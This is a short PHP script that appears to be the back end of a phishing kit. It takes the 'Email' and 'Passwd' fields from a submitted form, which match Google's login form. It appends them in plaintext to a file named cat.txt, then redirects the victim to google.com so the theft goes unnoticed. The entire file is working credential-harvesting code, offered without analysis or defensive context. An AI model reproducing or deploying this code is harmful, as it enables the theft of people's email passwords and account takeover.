<?php
$var = $_POST['Email'];
$var2 = $_POST['Passwd'];
$myFile = file_get_contents("protect.html");

if($myFile) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://google.com/');
}

exit();
?>

